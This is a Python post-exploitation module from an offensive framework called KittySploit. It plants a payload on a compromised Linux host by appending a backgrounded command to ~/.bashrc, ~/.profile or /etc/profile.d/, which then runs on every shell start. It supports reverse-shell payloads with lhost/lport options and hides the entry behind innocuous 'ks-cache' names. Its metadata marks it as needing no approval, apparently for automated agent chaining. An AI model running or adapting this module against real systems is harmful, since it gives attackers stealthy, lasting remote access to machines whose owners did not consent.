#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "Shell Profile Persistence",
        "description": (
            "Persists a payload in shell startup files: ~/.bashrc, ~/.profile, "
            "/etc/profile.d/, or a custom profile path."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "bashrc", "profile", "linux"],
        "references": ["https://attack.mitre.org/techniques/T1546/004/"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    profile_mode = OptChoice(
        "bashrc",
        "Target: bashrc, profile, profile.d, or custom path",
        True,
        choices=["bashrc", "profile", "profile.d", "custom"],
    )
    custom_path = OptString("", "Full path when profile_mode=custom", False)
    profile_d_name = OptString("ks-cache.sh", "Filename under /etc/profile.d/", False)
    target_user = OptString("", "User for user-level profiles (empty = session user)", False)
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/unix/bash_reverse_tcp)", True)
    target = OptChoice("Linux command", "Payload type", True, choices=["PHP", "Linux command"])
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)
    marker = OptString("ks-cache-persist", "Comment marker to detect existing entry", False)

    def _user_home(self) -> str:
        user = self._opt(self.target_user)
        if user == "root":
            return "/root"
        if user:
            return f"/home/{user}"
        return self.linux_execute('echo "$HOME"').strip() or "/root"

    def _profile_path(self) -> str:
        mode = self._opt(self.profile_mode)
        if mode == "custom":
            path = self._opt(self.custom_path)
            if not path:
                raise ProcedureError(FailureType.ConfigurationError, "custom_path required for custom mode")
            return path
        home = self._user_home()
        if mode == "bashrc":
            return f"{home}/.bashrc"
        if mode == "profile":
            return f"{home}/.profile"
        name = self._opt(self.profile_d_name) or "ks-cache.sh"
        return f"/etc/profile.d/{name}"

    def _profile_line(self, encoded: str) -> str:
        marker = self._opt(self.marker)
        escaped = self._runtime_command(encoded).replace("\\", "\\\\").replace('"', '\\"')
        return f'\n# {marker}\n/bin/sh -c "{escaped}" >/dev/null 2>&1 &\n'

    def check(self):
        try:
            path = self._profile_path()
        except ProcedureError as exc:
            print_error(str(exc))
            return False
        parent = path.rsplit("/", 1)[0]
        if self._opt(self.profile_mode) == "profile.d" and not self._is_root():
            print_error("Root required to write /etc/profile.d/")
            return False
        if not self._writable_target(path, parent):
            print_error(f"Cannot write profile target: {path}")
            return False
        print_success(f"Profile target writable: {path}")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        path = self._profile_path()
        marker = self._opt(self.marker)
        line = self._profile_line(encoded)

        if self.file_exist(path):
            self._maybe_backup(path, "shell_profile")
            existing = self.read_file(path)
            if marker in (existing or ""):
                print_warning("Persistence marker already present; skipping duplicate")
                return True
            print_status(f"Appending to {path}")
            if not self._append_remote_line(path, line.strip()):
                raise ProcedureError(FailureType.PayloadFailed, f"Cannot append to {path}")
        else:
            print_status(f"Creating {path}")
            shebang = "#!/bin/sh\n" if path.startswith("/etc/profile.d/") else ""
            content = shebang + line.lstrip("\n")
            mode = "0755" if path.startswith("/etc/profile.d/") else "0644"
            if not self._write_remote_file(path, content, mode=mode):
                raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {path}")

        print_good("Shell profile persistence installed.")
        print_status(f"Runs on interactive login/shell start: {path}")
        return True
